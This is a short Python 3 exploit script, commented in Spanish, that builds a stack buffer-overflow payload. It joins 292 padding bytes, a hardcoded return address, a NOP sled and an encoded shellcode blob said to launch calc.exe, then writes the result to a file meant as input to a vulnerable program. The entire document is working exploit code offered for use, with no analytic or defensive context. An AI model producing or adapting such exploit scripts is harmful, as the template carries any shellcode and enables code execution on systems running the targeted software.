#!/usr/bin/python3
# Shellcode para ejecutar: calc.exe"
buf =  b""
buf += b"\x89\xe1\xda\xcf\xd9\x71\xf4\x5b\x53\x59\x49\x49"
buf += b"\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
buf += b"\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
buf += b"\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
buf += b"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58\x4c"
buf += b"\x42\x55\x50\x55\x50\x45\x50\x43\x50\x4c\x49\x5a"
buf += b"\x45\x30\x31\x39\x50\x52\x44\x4c\x4b\x46\x30\x50"
buf += b"\x30\x4c\x4b\x50\x52\x44\x4c\x4c\x4b\x36\x32\x42"
buf += b"\x34\x4c\x4b\x32\x52\x37\x58\x34\x4f\x4e\x57\x31"
buf += b"\x5a\x36\x46\x36\x51\x4b\x4f\x4e\x4c\x57\x4c\x33"
buf += b"\x51\x43\x4c\x33\x32\x46\x4c\x31\x30\x4f\x31\x38"
buf += b"\x4f\x44\x4d\x55\x51\x58\x47\x4a\x42\x4b\x42\x51"
buf += b"\x42\x36\x37\x4c\x4b\x50\x52\x34\x50\x4c\x4b\x51"
buf += b"\x5a\x57\x4c\x4c\x4b\x30\x4c\x34\x51\x34\x38\x4d"
buf += b"\x33\x57\x38\x55\x51\x58\x51\x46\x31\x4c\x4b\x51"
buf += b"\x49\x37\x50\x33\x31\x58\x53\x4c\x4b\x57\x39\x44"
buf += b"\x58\x4d\x33\x47\x4a\x30\x49\x4c\x4b\x47\x44\x4c"
buf += b"\x4b\x45\x51\x38\x56\x50\x31\x4b\x4f\x4e\x4c\x39"
buf += b"\x51\x38\x4f\x54\x4d\x55\x51\x59\x57\x57\x48\x4d"
buf += b"\x30\x44\x35\x4b\x46\x44\x43\x33\x4d\x5a\x58\x37"
buf += b"\x4b\x53\x4d\x57\x54\x52\x55\x4a\x44\x31\x48\x4c"
buf += b"\x4b\x50\x58\x57\x54\x53\x31\x39\x43\x42\x46\x4c"
buf += b"\x4b\x44\x4c\x50\x4b\x4c\x4b\x31\x48\x45\x4c\x33"
buf += b"\x31\x48\x53\x4c\x4b\x35\x54\x4c\x4b\x33\x31\x48"
buf += b"\x50\x4d\x59\x47\x34\x56\x44\x36\x44\x51\x4b\x51"
buf += b"\x4b\x55\x31\x56\x39\x51\x4a\x46\x31\x4b\x4f\x4d"
buf += b"\x30\x51\x4f\x31\x4f\x50\x5a\x4c\x4b\x32\x32\x4a"
buf += b"\x4b\x4c\x4d\x31\x4d\x33\x5a\x53\x31\x4c\x4d\x4c"
buf += b"\x45\x58\x32\x45\x50\x33\x30\x55\x50\x36\x30\x53"
buf += b"\x58\x30\x31\x4c\x4b\x42\x4f\x4d\x57\x4b\x4f\x39"
buf += b"\x45\x4f\x4b\x4c\x30\x4e\x55\x49\x32\x51\x46\x32"
buf += b"\x48\x49\x36\x4a\x35\x4f\x4d\x4d\x4d\x4b\x4f\x39"
buf += b"\x45\x37\x4c\x33\x36\x53\x4c\x55\x5a\x4d\x50\x4b"
buf += b"\x4b\x4b\x50\x42\x55\x44\x45\x4f\x4b\x31\x57\x32"
buf += b"\x33\x33\x42\x32\x4f\x53\x5a\x53\x30\x56\x33\x4b"
buf += b"\x4f\x39\x45\x52\x43\x43\x51\x42\x4c\x45\x33\x56"
buf += b"\x4e\x33\x55\x32\x58\x45\x35\x53\x30\x41\x41"


# 6E595DDB
buffer = b"A" * 292 + b"\xDB\x5D\x59\x6E" + b"\x90" * 9 + buf

print(type(buffer))
payload = buffer

try:
    f = open("python3_shellcode.txt", "wb")
    print("[+] Creating %s bytes payload.." % len(payload))
    f.write(buffer)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created")